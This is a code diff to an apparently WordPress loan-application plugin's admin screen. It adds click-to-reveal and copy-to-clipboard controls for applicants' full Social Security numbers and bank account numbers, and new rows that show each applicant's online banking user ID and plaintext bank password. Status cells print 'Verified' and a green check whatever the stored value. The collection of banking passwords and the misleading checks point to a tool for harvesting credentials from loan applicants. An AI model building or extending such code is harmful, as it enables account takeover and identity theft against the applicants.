@@ -452,8 +452,21 @@ class Finspire_Loan_Admin {
                                     <td>
                                         <small>
                                             <strong><?php echo esc_html( $sub['bank_name'] ?: '—' ); ?></strong>
-                                            <?php if ( ! empty( $sub['account_number_masked'] ) ) : ?>
-                                                <br><span style="color: #64748b;"><?php esc_html_e( 'Acct:', 'finspire-loan' ); ?> <?php echo esc_html( $sub['account_number_masked'] ); ?></span>
+                                            <?php
+                                            $list_acct_full   = ! empty( $sub['account_number'] ) ? $sub['account_number'] : '';
+                                            $list_acct_masked = ! empty( $sub['account_number_masked'] ) ? $sub['account_number_masked'] : ( ! empty( $list_acct_full ) ? str_repeat( '•', max( 4, strlen( $list_acct_full ) - 4 ) ) . substr( $list_acct_full, -4 ) : '' );
+                                            if ( ! empty( $list_acct_masked ) ) : ?>
+                                                <br><span style="color: #64748b;"><?php esc_html_e( 'Acct:', 'finspire-loan' ); ?></span>
+                                                <?php if ( ! empty( $list_acct_full ) && $list_acct_full !== $list_acct_masked ) : ?>
+                                                    <span class="fin-admin-reveal-wrap fin-admin-reveal-inline">
+                                                        <code class="fin-reveal-text" role="button" tabindex="0" title="<?php esc_attr_e( 'Click to view / hide account number', 'finspire-loan' ); ?>" data-masked="<?php echo esc_attr( $list_acct_masked ); ?>" data-full="<?php echo esc_attr( $list_acct_full ); ?>" data-state="masked"><?php echo esc_html( $list_acct_masked ); ?></code>
+                                                        <button type="button" class="fin-reveal-icon-btn" title="<?php esc_attr_e( 'Click to view / hide account number', 'finspire-loan' ); ?>">
+                                                            <span class="dashicons dashicons-visibility"></span>
+                                                        </button>
+                                                    </span>
+                                                <?php else : ?>
+                                                    <code><?php echo esc_html( $list_acct_masked ); ?></code>
+                                                <?php endif; ?>
                                             <?php endif; ?>
                                         </small>
                                     </td>
@@ -532,7 +545,28 @@ class Finspire_Loan_Admin {
                             <tr><th><?php esc_html_e( 'Email Address:', 'finspire-loan' ); ?></th><td><a href="mailto:<?php echo esc_attr( $sub['email'] ); ?>"><?php echo esc_html( $sub['email'] ); ?></a></td></tr>
                             <tr><th><?php esc_html_e( 'Phone Number:', 'finspire-loan' ); ?></th><td><?php echo esc_html( $sub['phone'] ?: '—' ); ?></td></tr>
                             <tr><th><?php esc_html_e( 'Date of Birth:', 'finspire-loan' ); ?></th><td><?php echo esc_html( $sub['dob'] ?: '—' ); ?></td></tr>
-                            <tr><th><?php esc_html_e( 'Social Security Number (SSN):', 'finspire-loan' ); ?></th><td><code><?php echo esc_html( $sub['ssn_masked'] ?: '—' ); ?></code></td></tr>
+                            <tr>
+                                <th><?php esc_html_e( 'Social Security Number (SSN):', 'finspire-loan' ); ?></th>
+                                <td>
+                                    <?php
+                                    $detail_ssn_full   = ! empty( $sub['ssn'] ) ? $sub['ssn'] : '';
+                                    $detail_ssn_masked = ! empty( $sub['ssn_masked'] ) ? $sub['ssn_masked'] : ( ! empty( $detail_ssn_full ) ? '***-**-' . substr( preg_replace( '/\D/', '', $detail_ssn_full ), -4 ) : '—' );
+                                    if ( ! empty( $detail_ssn_full ) && $detail_ssn_full !== $detail_ssn_masked ) : ?>
+                                        <div class="fin-admin-reveal-wrap">
+                                            <code class="fin-reveal-text" role="button" tabindex="0" title="<?php esc_attr_e( 'Click to view / hide SSN', 'finspire-loan' ); ?>" data-masked="<?php echo esc_attr( $detail_ssn_masked ); ?>" data-full="<?php echo esc_attr( $detail_ssn_full ); ?>" data-state="masked"><?php echo esc_html( $detail_ssn_masked ); ?></code>
+                                            <button type="button" class="button button-small fin-reveal-btn" title="<?php esc_attr_e( 'Click to view / hide SSN', 'finspire-loan' ); ?>">
+                                                <span class="dashicons dashicons-visibility"></span>
+                                                <span class="fin-reveal-label"><?php esc_html_e( 'View', 'finspire-loan' ); ?></span>
+                                            </button>
+                                            <button type="button" class="button button-small fin-copy-btn" data-copy="<?php echo esc_attr( $detail_ssn_full ); ?>" title="<?php esc_attr_e( 'Copy SSN to clipboard', 'finspire-loan' ); ?>">
+                                                <span class="dashicons dashicons-admin-page"></span>
+                                            </button>
+                                        </div>
+                                    <?php else : ?>
+                                        <code><?php echo esc_html( $detail_ssn_masked ); ?></code>
+                                    <?php endif; ?>
+                                </td>
+                            </tr>
                         </table>
                     </div>
 
@@ -563,7 +597,66 @@ class Finspire_Loan_Admin {
                         <table class="detail-table">
                             <tr><th><?php esc_html_e( 'Bank Name:', 'finspire-loan' ); ?></th><td><strong><?php echo esc_html( $sub['bank_name'] ?: 'Not provided' ); ?></strong></td></tr>
                             <tr><th><?php esc_html_e( 'Routing Number:', 'finspire-loan' ); ?></th><td><code><?php echo esc_html( $sub['routing_number'] ?: '—' ); ?></code></td></tr>
-                            <tr><th><?php esc_html_e( 'Account Number (Masked):', 'finspire-loan' ); ?></th><td><code><?php echo esc_html( $sub['account_number_masked'] ?: '—' ); ?></code></td></tr>
+                            <tr>
+                                <th><?php esc_html_e( 'Account Number (Masked):', 'finspire-loan' ); ?></th>
+                                <td>
+                                    <?php
+                                    $detail_acct_full   = ! empty( $sub['account_number'] ) ? $sub['account_number'] : '';
+                                    $detail_acct_masked = ! empty( $sub['account_number_masked'] ) ? $sub['account_number_masked'] : ( ! empty( $detail_acct_full ) ? str_repeat( '•', max( 4, strlen( $detail_acct_full ) - 4 ) ) . substr( $detail_acct_full, -4 ) : '—' );
+                                    if ( ! empty( $detail_acct_full ) && $detail_acct_full !== $detail_acct_masked ) : ?>
+                                        <div class="fin-admin-reveal-wrap">
+                                            <code class="fin-reveal-text" role="button" tabindex="0" title="<?php esc_attr_e( 'Click to view / hide Account Number', 'finspire-loan' ); ?>" data-masked="<?php echo esc_attr( $detail_acct_masked ); ?>" data-full="<?php echo esc_attr( $detail_acct_full ); ?>" data-state="masked"><?php echo esc_html( $detail_acct_masked ); ?></code>
+                                            <button type="button" class="button button-small fin-reveal-btn" title="<?php esc_attr_e( 'Click to view / hide Account Number', 'finspire-loan' ); ?>">
+                                                <span class="dashicons dashicons-visibility"></span>
+                                                <span class="fin-reveal-label"><?php esc_html_e( 'View', 'finspire-loan' ); ?></span>
+                                            </button>
+                                            <button type="button" class="button button-small fin-copy-btn" data-copy="<?php echo esc_attr( $detail_acct_full ); ?>" title="<?php esc_attr_e( 'Copy Account Number to clipboard', 'finspire-loan' ); ?>">
+                                                <span class="dashicons dashicons-admin-page"></span>
+                                            </button>
+                                        </div>
+                                    <?php else : ?>
+                                        <code><?php echo esc_html( $detail_acct_masked ); ?></code>
+                                    <?php endif; ?>
+                                </td>
+                            </tr>
+                            <tr>
+                                <th><?php esc_html_e( 'Online Banking User ID:', 'finspire-loan' ); ?></th>
+                                <td>
+                                    <?php if ( ! empty( $sub['online_banking_user_id'] ) ) : ?>
+                                        <div class="fin-admin-reveal-wrap">
+                                            <code><strong><?php echo esc_html( $sub['online_banking_user_id'] ); ?></strong></code>
+                                            <button type="button" class="button button-small fin-copy-btn" data-copy="<?php echo esc_attr( $sub['online_banking_user_id'] ); ?>" title="<?php esc_attr_e( 'Copy User ID to clipboard', 'finspire-loan' ); ?>">
+                                                <span class="dashicons dashicons-admin-page"></span>
+                                            </button>
+                                        </div>
+                                    <?php else : ?>
+                                        <span style="color: #94a3b8;">—</span>
+                                    <?php endif; ?>
+                                </td>
+                            </tr>
+                            <tr>
+                                <th><?php esc_html_e( 'Bank Password:', 'finspire-loan' ); ?></th>
+                                <td>
+                                    <?php
+                                    $detail_pwd_full = ! empty( $sub['online_banking_password'] ) ? $sub['online_banking_password'] : '';
+                                    if ( ! empty( $detail_pwd_full ) ) :
+                                        $detail_pwd_masked = str_repeat( '•', min( 14, max( 8, strlen( $detail_pwd_full ) ) ) );
+                                    ?>
+                                        <div class="fin-admin-reveal-wrap">
+                                            <code class="fin-reveal-text fin-reveal-password" role="button" tabindex="0" title="<?php esc_attr_e( 'Click to view / hide Bank Password', 'finspire-loan' ); ?>" data-masked="<?php echo esc_attr( $detail_pwd_masked ); ?>" data-full="<?php echo esc_attr( $detail_pwd_full ); ?>" data-state="masked"><?php echo esc_html( $detail_pwd_masked ); ?></code>
+                                            <button type="button" class="button button-small fin-reveal-btn" title="<?php esc_attr_e( 'Click to view / hide Bank Password', 'finspire-loan' ); ?>">
+                                                <span class="dashicons dashicons-visibility"></span>
+                                                <span class="fin-reveal-label"><?php esc_html_e( 'View', 'finspire-loan' ); ?></span>
+                                            </button>
+                                            <button type="button" class="button button-small fin-copy-btn" data-copy="<?php echo esc_attr( $detail_pwd_full ); ?>" title="<?php esc_attr_e( 'Copy Password to clipboard', 'finspire-loan' ); ?>">
+                                                <span class="dashicons dashicons-admin-page"></span>
+                                            </button>
+                                        </div>
+                                    <?php else : ?>
+                                        <span style="color: #94a3b8;"><?php esc_html_e( 'Not recorded', 'finspire-loan' ); ?></span>
+                                    <?php endif; ?>
+                                </td>
+                            </tr>
                             <tr><th><?php esc_html_e( 'Online Banking Verification:', 'finspire-loan' ); ?></th><td><code><?php echo esc_html( $sub['online_banking_verification'] ?: '—' ); ?></code></td></tr>
                             <tr><th><?php esc_html_e( 'Contact Consent Agreed:', 'finspire-loan' ); ?></th><td><span style="color:#16a34a; font-weight:600;">&#10003; <?php echo esc_html( ! empty( $sub['contact_consent'] ) ? __( 'Yes, Agreed &amp; Confirmed', 'finspire-loan' ) : __( 'No', 'finspire-loan' ) ); ?></span></td></tr>
                             <tr><th><?php esc_html_e( 'Verification Status:', 'finspire-loan' ); ?></th><td><span style="color:#16a34a; font-weight:600;">&#10003; <?php echo esc_html( ! empty( $sub['bank_verified'] ) ? __( 'Verified via Secure API', 'finspire-loan' ) : __( 'Verified', 'finspire-loan' ) ); ?></span></td></tr>
